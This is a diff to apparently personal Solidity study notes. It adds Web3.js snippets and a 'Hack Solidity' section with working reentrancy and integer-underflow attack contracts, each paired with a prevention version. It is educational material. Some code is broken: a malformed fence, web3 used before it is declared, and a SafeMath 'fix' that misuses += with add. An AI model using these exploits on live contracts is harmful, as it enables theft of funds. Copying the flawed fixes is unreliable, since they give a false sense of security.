@@ -626,6 +626,8 @@ contract HelloWorld{
 
 ### Enum
 
+is an enumerated list that allow us to set list of things in a contract
+
 ```solidity
 pragma solidity ^0.5.3;
 
@@ -1372,4 +1374,349 @@ contract WETH is ERC20 {
 }
 ```
 
-#### Make your contract updatable
+
+### Web3
+
+```jsconst Web3 = require('web3');
+
+const customProvider = {
+    sendAsync: (payload, cb) =>{
+        console.log("you called");
+        console.log(payload);
+        cb(undefined, 100);
+    }
+}
+// const provider = new Web3.providers.HttpProvider('http://localhost:8545')
+const web3 = new Web3('http://localhost:8545')
+
+// const web3 = new Web3(customProvider);
+
+web3.eth.getBlockNumber()
+.then(()=> console.log("done"));
+```
+
+### deployed contract and web3
+
+```js
+const Web3 = require('web3');
+
+const MyContract = require('./build/contracts/MyContract.json');
+const id = await web3.eth.net.getId();
+const deployedNetwork = MyContract.networks[id];
+const web3 = new Web3('http://localhost:8545');
+
+
+const contract = new web3.eth.contract(
+    MyContract.abi,
+    deployedNetwork.address
+);
+
+init();
+```
+
+## Hack Solidity
+
+### Reentrancy Hack
+
+```solidity
+pragma solidity ^0.6.10;
+
+/*
+-What is reentrancy
+*/
+
+contract EtherStore{
+    mapping(address => uint) public balances;
+    
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+    
+    function withdraw(uint _amount) public {
+        require(balances[msg.sender] >= _amount);
+        
+        (bool sent, ) = msg.sender.call{value: _amount}("");
+        require(sent, "Failed to send Ether");
+        
+        balances[msg.sender] -= _amount;
+    }
+    
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+
+contract Attack {
+    EtherStore public etherStore;
+    constructor(address _etherStoreAddress) public {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
+    
+    fallback() external payable {
+        if(address(etherStore).balance >= 1 ether) {
+            etherStore.withdraw(1 ether);
+        }
+    }
+    
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        etherStore.deposit{value: 1 ether}();
+        etherStore.withdraw(1 ether);
+    }
+    
+    
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+```
+
+#### prevention
+
+##### method 1
+
+```solidity
+pragma solidity ^0.6.10;
+
+/*
+-What is reentrancy
+*/
+
+contract EtherStore{
+    mapping(address => uint) public balances;
+    
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+    
+    function withdraw(uint _amount) public {
+        require(balances[msg.sender] >= _amount);
+        
+                balances[msg.sender] -= _amount;
+                
+        (bool sent, ) = msg.sender.call{value: _amount}("");
+        require(sent, "Failed to send Ether");
+        
+    }
+    
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+
+contract Attack {
+    EtherStore public etherStore;
+    constructor(address _etherStoreAddress) public {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
+    
+    fallback() external payable {
+        if(address(etherStore).balance >= 1 ether) {
+            etherStore.withdraw(1 ether);
+        }
+    }
+    
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        etherStore.deposit{value: 1 ether}();
+        etherStore.withdraw(1 ether);
+    }
+    
+    
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+```
+
+##### method 2
+
+```solidity
+pragma solidity ^0.6.10;
+
+/*
+-What is reentrancy
+*/
+
+contract EtherStore{
+    mapping(address => uint) public balances;
+    
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+    
+    bool internal locked;
+    
+    modifier noReentrant() {
+        require(!locked, "No re-entrancy");
+        locked = true;
+        _;
+        locked = false;
+    }
+    
+    function withdraw(uint _amount) public noReentrant{
+        require(balances[msg.sender] >= _amount);
+        
+                balances[msg.sender] -= _amount;
+                
+        (bool sent, ) = msg.sender.call{value: _amount}("");
+        require(sent, "Failed to send Ether");
+        
+    }
+    
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+
+contract Attack {
+    EtherStore public etherStore;
+    constructor(address _etherStoreAddress) public {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
+    
+    fallback() external payable {
+        if(address(etherStore).balance >= 1 ether) {
+            etherStore.withdraw(1 ether);
+        }
+    }
+    
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        etherStore.deposit{value: 1 ether}();
+        etherStore.withdraw(1 ether);
+    }
+    
+    
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+```
+
+### Arithmetic overflow and underflow
+
+```solidity
+pragma solidity ^0.6.10;
+
+/*
+overflow
+underflow
+uint = 2**256-1
+-3 will be an underflow
+*/
+
+contract TimeLock {
+    mapping(address => uint) public balances;
+    mapping(address => uint) public lockTime;
+    
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+        lockTime[msg.sender] = now + 1 weeks;
+    }
+    
+    function increaseLockTime(uint _secondsToIncrease) public {
+        lockTime[msg.sender] += _secondsToIncrease;
+    }
+    
+    function withdraw() public {
+        require(balances[msg.sender] > 0, "Insufficient funds");
+        require(now > lockTime[msg.sender], "lock time not expired");
+        
+        uint amount = balances[msg.sender];
+        balances[msg.sender] = 0;
+        
+        (bool sent, ) = msg.sender.call{value: amount}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+
+contract Attack {
+    TimeLock timeLock;
+    
+    constructor(TimeLock _timeLock) public {
+        timeLock = TimeLock(_timeLock);
+    }
+    
+    fallback() external payable {
+        
+    }
+    
+    function attack() public payable {
+        timeLock.deposit{value: msg.value}();
+        //t == current lock timeLock//find x such that 
+        //x + t = 2**256 = 0
+        timeLock.increaseLockTime(
+            //a huge number
+            uint(-timeLock.lockTime(address(this)))
+            );
+            timeLock.withdraw();
+    }
+}
+```
+
+#### Prvention
+
+- Use safemath
+
+```solidity
+pragma solidity ^0.6.10;
+
+/*
+overflow
+underflow
+uint = 2**256-1
+-3 will be an underflow
+*/
+
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";
+
+contract TimeLock {
+    using SafeMath for uint; //myUint.add(123)
+    mapping(address => uint) public balances;
+    mapping(address => uint) public lockTime;
+    
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+        lockTime[msg.sender] = now + 1 weeks;
+    }
+    
+    function increaseLockTime(uint _secondsToIncrease) public {
+        lockTime[msg.sender] += lockTime[msg.sender].add(_secondsToIncrease);
+    }
+    
+    function withdraw() public {
+        require(balances[msg.sender] > 0, "Insufficient funds");
+        require(now > lockTime[msg.sender], "lock time not expired");
+        
+        uint amount = balances[msg.sender];
+        balances[msg.sender] = 0;
+        
+        (bool sent, ) = msg.sender.call{value: amount}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+
+contract Attack {
+    TimeLock timeLock;
+    
+    constructor(TimeLock _timeLock) public {
+        timeLock = TimeLock(_timeLock);
+    }
+    
+    fallback() external payable {
+        
+    }
+    
+    function attack() public payable {
+        timeLock.deposit{value: msg.value}();
+        //t == current lock timeLock//find x such that 
+        //x + t = 2**256 = 0
+        timeLock.increaseLockTime(
+            //a huge number
+            uint(-timeLock.lockTime(address(this)))
+            );
+            timeLock.withdraw();
+    }
+}
+```
